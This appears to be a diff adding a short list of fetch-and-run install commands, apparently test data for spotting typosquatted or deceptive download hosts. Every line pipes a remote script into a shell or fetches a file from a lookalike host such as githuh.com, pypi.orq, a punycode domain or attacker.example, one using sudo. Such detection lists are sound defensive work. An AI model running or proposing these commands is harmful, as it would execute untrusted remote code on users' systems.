@@ -1,0 +1,7 @@
+curl -fsSL githuh.com/install.sh | sh
+curl -fsSL https://raw.githubusercontent.co/x/install.sh | bash
+curl -fsSL https://xn--gthub-3ve.com/install.sh | sudo bash
+curl -fsSL https://github.com.attacker.example/install.sh | sh
+curl -fsSL https://github.com@attacker.example/install.sh | sh
+wget -qO- brev.sh/install | sh
+curl -O https://pypi.orq/simple/x.tgz
